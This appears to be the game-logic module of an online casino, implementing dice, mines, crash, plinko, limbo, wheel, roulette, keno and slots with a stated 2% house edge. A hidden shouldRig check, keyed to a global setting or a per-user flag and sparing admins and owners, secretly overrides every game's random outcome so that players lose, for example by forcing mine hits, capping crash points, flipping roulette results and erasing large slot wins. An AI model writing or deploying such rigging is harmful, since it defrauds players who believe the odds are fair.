import crypto from 'crypto';
import Settings from '../models/Settings.js';

const HOUSE_EDGE = 0.02;

const shouldRig = async (user) => {
  if (!user) return await Settings.getRigMode();
  if (user.isAdmin || user.isOwner) return false;
  if (user.isRigged) return true;
  return await Settings.getRigMode();
};

export const GameService = {
  dice: async (chance, user = null) => {
    let roll = crypto.randomInt(0, 10000) / 100;
    
    if (await shouldRig(user)) {
      roll = chance + crypto.randomInt(1, 50);
      if (roll > 99.99) roll = 99.99;
    }
    
    const win = roll < chance;
    const multiplier = win ? (100 / chance) * (1 - HOUSE_EDGE) : 0;
    return { roll, win, multiplier, result: roll.toFixed(2) };
  },

  minesInit: (mineCount) => {
    const gridSize = 25;
    const mines = new Set();
    while (mines.size < mineCount) {
      mines.add(crypto.randomInt(0, gridSize));
    }
    return {
      mines: Array.from(mines),
      mineCount,
      revealed: [],
      gridSize
    };
  },

  minesReveal: async (gameState, position, user = null) => {
    const { mines, mineCount, revealed, gridSize } = gameState;
    const safeSpots = gridSize - mineCount;
    
    if (revealed.includes(position)) {
      return { error: 'Already revealed', gameState };
    }
    
    let hitMine = mines.includes(position);
    
    if (await shouldRig(user) && !hitMine && revealed.length >= 2) {
      if (crypto.randomInt(0, 100) < 40) {
        hitMine = true;
      }
    }
    
    const newRevealed = [...revealed, position];
    const newGameState = { ...gameState, revealed: newRevealed };
    
    if (hitMine) {
      return { 
        win: false, 
        multiplier: 0, 
        mines, 
        result: 'mine_hit',
        gameState: newGameState,
        gameOver: true
      };
    }
    
    const multiplier = Math.pow(gridSize / (gridSize - mineCount), newRevealed.length) * (1 - HOUSE_EDGE);
    const remaining = safeSpots - newRevealed.length;
    
    return { 
      win: true, 
      multiplier, 
      result: 'safe', 
      canCashout: remaining > 0,
      gameState: newGameState,
      gameOver: false
    };
  },

  minesCashout: (gameState) => {
    const { mineCount, revealed, gridSize } = gameState;
    if (revealed.length === 0) {
      return { win: false, multiplier: 0 };
    }
    const multiplier = Math.pow(gridSize / (gridSize - mineCount), revealed.length) * (1 - HOUSE_EDGE);
    return { win: true, multiplier };
  },

  crash: async (user = null) => {
    const r = crypto.randomInt(0, 10000) / 10000;
    let crashPoint = Math.max(1, Math.floor(100 * (1 / (1 - r))) / 100);
    
    if (await shouldRig(user)) {
      crashPoint = Math.min(crashPoint, 1 + crypto.randomInt(0, 150) / 100);
    }
    
    return crashPoint > 100 ? 100 : crashPoint;
  },

  plinko: async (risk, rows, user = null) => {
    const path = [];
    let position = 0;
    
    for (let i = 0; i < rows; i++) {
      const goRight = crypto.randomInt(0, 2) === 1;
      position += goRight ? 1 : 0;
      path.push(goRight ? 'R' : 'L');
    }
    
    const multipliers = {
      low: [5.6, 2.1, 1.1, 1, 0.5, 1, 1.1, 2.1, 5.6],
      medium: [13, 3, 1.3, 0.7, 0.4, 0.7, 1.3, 3, 13],
      high: [29, 4, 1.5, 0.3, 0.2, 0.3, 1.5, 4, 29]
    };
    
    const mults = multipliers[risk] || multipliers.medium;
    let bucketIndex = Math.min(position, mults.length - 1);
    
    if (await shouldRig(user)) {
      const lowPayoutIndexes = risk === 'low' ? [3, 4, 5] : (risk === 'medium' ? [3, 4, 5] : [3, 4, 5]);
      bucketIndex = lowPayoutIndexes[crypto.randomInt(0, lowPayoutIndexes.length)];
    }
    
    const multiplier = mults[bucketIndex] * (1 - HOUSE_EDGE);
    
    return { path, position: bucketIndex, multiplier, win: multiplier >= 1, bucketIndex };
  },

  limbo: async (target, user = null) => {
    const r = crypto.randomInt(1, 10001) / 10000;
    let result = Math.max(1, Math.floor(100 * (1 / r)) / 100);
    
    if (await shouldRig(user)) {
      result = Math.min(result, target - 0.01);
      if (result < 1) result = 1;
    }
    
    const win = result >= target;
    const multiplier = win ? target * (1 - HOUSE_EDGE) : 0;
    return { result, target, win, multiplier };
  },

  wheel: async (segments, user = null) => {
    const totalWeight = segments.reduce((sum, s) => sum + s.weight, 0);
    let spin = crypto.randomInt(0, totalWeight);
    
    if (await shouldRig(user)) {
      let cumulative = 0;
      for (const segment of segments) {
        if (segment.multiplier === 0 || segment.multiplier < 1) {
          spin = cumulative;
          break;
        }
        cumulative += segment.weight;
      }
    }
    
    let cumulative = 0;
    let winner = segments[0];
    let winnerIndex = 0;
    
    for (let i = 0; i < segments.length; i++) {
      cumulative += segments[i].weight;
      if (spin < cumulative) {
        winner = segments[i];
        winnerIndex = i;
        break;
      }
    }
    
    return { 
      result: winner.value, 
      multiplier: winner.multiplier * (1 - HOUSE_EDGE),
      win: winner.multiplier > 0,
      segmentIndex: winnerIndex
    };
  },

  roulette: async (betType, betValue, user = null) => {
    let result = crypto.randomInt(0, 37);
    
    const redNumbers = [1,3,5,7,9,12,14,16,18,19,21,23,25,27,30,32,34,36];
    
    if (await shouldRig(user)) {
      switch(betType) {
        case 'red':
          result = redNumbers.includes(result) ? 0 : result;
          break;
        case 'black':
          result = !redNumbers.includes(result) && result !== 0 ? redNumbers[crypto.randomInt(0, redNumbers.length)] : result;
          break;
        case 'even':
          result = result % 2 === 0 && result !== 0 ? result + 1 : result;
          if (result > 36) result = 1;
          break;
        case 'odd':
          result = result % 2 === 1 ? result + 1 : result;
          if (result > 36) result = 0;
          break;
        case 'number':
          if (result === parseInt(betValue)) {
            result = (parseInt(betValue) + 1) % 37;
          }
          break;
      }
    }
    
    const isZero = result === 0;
    const isRed = redNumbers.includes(result);
    const isBlack = !isZero && !isRed;
    const isEven = result !== 0 && result % 2 === 0;
    const isOdd = result !== 0 && result % 2 === 1;
    const isLow = result >= 1 && result <= 18;
    const isHigh = result >= 19 && result <= 36;

    let win = false;
    let multiplier = 0;

    switch(betType) {
      case 'number':
        win = result === parseInt(betValue);
        multiplier = win ? 35 : 0;
        break;
      case 'red':
        win = isRed;
        multiplier = win ? 2 : 0;
        break;
      case 'black':
        win = isBlack;
        multiplier = win ? 2 : 0;
        break;
      case 'even':
        win = isEven;
        multiplier = win ? 2 : 0;
        break;
      case 'odd':
        win = isOdd;
        multiplier = win ? 2 : 0;
        break;
      case 'low':
        win = isLow;
        multiplier = win ? 2 : 0;
        break;
      case 'high':
        win = isHigh;
        multiplier = win ? 2 : 0;
        break;
    }

    return { result, win, multiplier: multiplier * (1 - HOUSE_EDGE), isRed, isBlack, isZero };
  },

  keno: async (selectedNumbers, risk, user = null) => {
    const drawnNumbers = new Set();
    while (drawnNumbers.size < 10) {
      drawnNumbers.add(crypto.randomInt(1, 41));
    }
    
    let hits = selectedNumbers.filter(n => drawnNumbers.has(n)).length;
    
    if (await shouldRig(user) && hits > 2) {
      hits = crypto.randomInt(0, 3);
    }
    
    const multiplierTables = {
      classic: {
        1: [0, 3.8],
        2: [0, 1.9, 5.5],
        3: [0, 1.2, 2.5, 26],
        4: [0, 0.5, 2, 6, 91],
        5: [0, 0.3, 1.5, 3, 15, 300],
        6: [0, 0.2, 1, 2, 6, 50, 1000],
        7: [0, 0.2, 0.5, 1.5, 3, 15, 100, 2500],
        8: [0, 0.2, 0.5, 1, 2, 8, 50, 500, 5000],
        9: [0, 0.2, 0.3, 0.5, 1.5, 4, 20, 100, 1500, 10000],
        10: [0, 0.2, 0.3, 0.5, 1, 3, 10, 50, 500, 5000, 25000]
      },
      low: {
        1: [0, 2.9],
        2: [0, 1.4, 3.5],
        3: [0, 1.1, 1.8, 15],
        4: [0, 0.4, 1.5, 4, 50],
        5: [0, 0.3, 1.2, 2.5, 10, 180],
        6: [0, 0.2, 0.8, 1.8, 5, 35, 600],
        7: [0, 0.2, 0.5, 1.2, 2.5, 10, 75, 1500],
        8: [0, 0.2, 0.4, 1, 1.8, 6, 35, 350, 3000],
        9: [0, 0.2, 0.3, 0.5, 1.2, 3, 15, 75, 1000, 6000],
        10: [0, 0.2, 0.3, 0.4, 1, 2.5, 8, 40, 400, 3500, 15000]
      },
      medium: {
        1: [0, 3.8],
        2: [0, 1.9, 5.5],
        3: [0, 1.2, 2.5, 26],
        4: [0, 0.5, 2, 6, 91],
        5: [0, 0.3, 1.5, 3, 15, 300],
        6: [0, 0.2, 1, 2, 6, 50, 1000],
        7: [0, 0.2, 0.5, 1.5, 3, 15, 100, 2500],
        8: [0, 0.2, 0.5, 1, 2, 8, 50, 500, 5000],
        9: [0, 0.2, 0.3, 0.5, 1.5, 4, 20, 100, 1500, 10000],
        10: [0, 0.2, 0.3, 0.5, 1, 3, 10, 50, 500, 5000, 25000]
      },
      high: {
        1: [0, 4.9],
        2: [0, 2.5, 8],
        3: [0, 1.5, 3.5, 40],
        4: [0, 0.6, 2.5, 9, 150],
        5: [0, 0.4, 2, 4, 25, 500],
        6: [0, 0.3, 1.2, 3, 10, 80, 1800],
        7: [0, 0.2, 0.6, 2, 5, 25, 180, 4500],
        8: [0, 0.2, 0.5, 1.5, 3, 12, 80, 800, 10000],
        9: [0, 0.2, 0.4, 0.8, 2, 6, 35, 200, 2500, 20000],
        10: [0, 0.2, 0.3, 0.6, 1.5, 5, 15, 80, 800, 10000, 50000]
      }
    };
    
    const table = multiplierTables[risk] || multiplierTables.classic;
    const selectedCount = selectedNumbers.length;
    const multipliers = table[selectedCount] || table[10];
    const multiplier = (multipliers[hits] || 0) * (1 - HOUSE_EDGE);
    
    return {
      drawnNumbers: Array.from(drawnNumbers).sort((a, b) => a - b),
      selectedNumbers,
      hits,
      multiplier,
      win: multiplier > 0
    };
  },

  slots: async (betMultiplier = 1, user = null) => {
    const symbols = ['cherry', 'lemon', 'orange', 'plum', 'bell', 'bar', 'seven', 'scatter'];
    const weights = [25, 22, 20, 18, 10, 3, 1, 1];
    
    const getRandomSymbol = () => {
      const totalWeight = weights.reduce((a, b) => a + b, 0);
      let random = crypto.randomInt(0, totalWeight);
      for (let i = 0; i < symbols.length; i++) {
        random -= weights[i];
        if (random < 0) return symbols[i];
      }
      return symbols[0];
    };
    
    const reels = [];
    for (let col = 0; col < 5; col++) {
      const reel = [];
      for (let row = 0; row < 3; row++) {
        reel.push(getRandomSymbol());
      }
      reels.push(reel);
    }
    
    const paylines = [
      [[0,1], [1,1], [2,1], [3,1], [4,1]],
      [[0,0], [1,0], [2,0], [3,0], [4,0]],
      [[0,2], [1,2], [2,2], [3,2], [4,2]],
      [[0,0], [1,1], [2,2], [3,1], [4,0]],
      [[0,2], [1,1], [2,0], [3,1], [4,2]],
      [[0,0], [1,0], [2,1], [3,2], [4,2]],
      [[0,2], [1,2], [2,1], [3,0], [4,0]],
      [[0,1], [1,0], [2,0], [3,0], [4,1]],
      [[0,1], [1,2], [2,2], [3,2], [4,1]],
      [[0,0], [1,1], [2,1], [3,1], [4,0]],
      [[0,2], [1,1], [2,1], [3,1], [4,2]],
      [[0,1], [1,1], [2,0], [3,1], [4,1]],
      [[0,1], [1,1], [2,2], [3,1], [4,1]],
      [[0,0], [1,1], [2,0], [3,1], [4,0]],
      [[0,2], [1,1], [2,2], [3,1], [4,2]],
      [[0,0], [1,0], [2,1], [3,0], [4,0]],
      [[0,2], [1,2], [2,1], [3,2], [4,2]],
      [[0,1], [1,0], [2,1], [3,2], [4,1]],
      [[0,1], [1,2], [2,1], [3,0], [4,1]],
      [[0,0], [1,2], [2,0], [3,2], [4,0]]
    ];
    
    const payTable = {
      cherry: { 3: 2, 4: 5, 5: 15 },
      lemon: { 3: 2, 4: 5, 5: 15 },
      orange: { 3: 3, 4: 8, 5: 20 },
      plum: { 3: 4, 4: 10, 5: 25 },
      bell: { 3: 10, 4: 25, 5: 75 },
      bar: { 3: 25, 4: 75, 5: 250 },
      seven: { 3: 50, 4: 150, 5: 500 }
    };
    
    let scatterCount = 0;
    for (let col = 0; col < 5; col++) {
      for (let row = 0; row < 3; row++) {
        if (reels[col][row] === 'scatter') scatterCount++;
      }
    }
    
    let totalMultiplier = 0;
    const winningLines = [];
    
    for (let i = 0; i < paylines.length; i++) {
      const lineSymbols = paylines[i].map(([col, row]) => reels[col][row]);
      const firstSymbol = lineSymbols[0];
      
      if (firstSymbol === 'scatter') continue;
      
      let matchCount = 1;
      for (let j = 1; j < lineSymbols.length; j++) {
        if (lineSymbols[j] === firstSymbol) matchCount++;
        else break;
      }
      
      if (matchCount >= 3 && payTable[firstSymbol]) {
        const lineMultiplier = payTable[firstSymbol][matchCount] || 0;
        if (lineMultiplier > 0) {
          totalMultiplier += lineMultiplier;
          winningLines.push({ line: i + 1, symbol: firstSymbol, count: matchCount, multiplier: lineMultiplier });
        }
      }
    }
    
    let freeSpins = 0;
    let bonusMultiplier = 0;
    if (scatterCount >= 3) {
      freeSpins = scatterCount === 3 ? 10 : (scatterCount === 4 ? 15 : 20);
      bonusMultiplier = scatterCount === 3 ? 5 : (scatterCount === 4 ? 20 : 50);
      totalMultiplier += bonusMultiplier;
    }
    
    if (await shouldRig(user) && totalMultiplier > 5) {
      totalMultiplier = crypto.randomInt(0, 3);
      winningLines.length = 0;
    }
    
    const finalMultiplier = totalMultiplier * (1 - HOUSE_EDGE);
    
    return {
      reels,
      winningLines,
      scatterCount,
      freeSpins,
      multiplier: finalMultiplier,
      win: finalMultiplier > 0
    };
  }
};

export default GameService;
